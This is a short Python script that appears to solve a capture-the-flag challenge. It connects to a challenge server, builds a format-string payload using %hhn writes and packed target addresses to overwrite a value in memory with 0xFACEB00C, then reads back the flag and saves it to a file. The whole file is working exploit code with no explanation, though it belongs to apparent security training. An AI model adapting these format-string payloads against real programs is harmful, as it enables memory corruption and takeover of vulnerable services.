import socket
import binascii
from binascii import unhexlify

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('cns.ctf.tw', 7003))


# msg deals with params
magic = 'FACEB00C'
pad_len = [int('0x' + magic[i:i+2], 16) for i in range(0, len(magic), 2)][::-1]

msg = ''
pad_st = 0
pos_st = 12
for i in xrange(len(pad_len)):
    msg += '%' + str(pad_len[i] - pad_st) + 'c%' + str(pos_st + i) + '$hhn'
    pad_st = pad_len[i]
msg += 'A' * ((pos_st - 6) * 8 - len(msg))


# msg deals with address
addr = 0x0000000000601094
for i in xrange(len(pad_len)):
    addr_str = format(addr + i, 'x')
    addr_str = '0' * (16 - len(addr_str)) + addr_str
    msg += unhexlify(addr_str)[::-1]


# Send something
data = client_socket.recv(1024)
client_socket.send(msg + '\n')

# receive output from printf
data = client_socket.recv(1024)

# Catch the flag
data = client_socket.recv(1024)
with open('ans2-2.txt', 'w') as f:
    f.write(data)
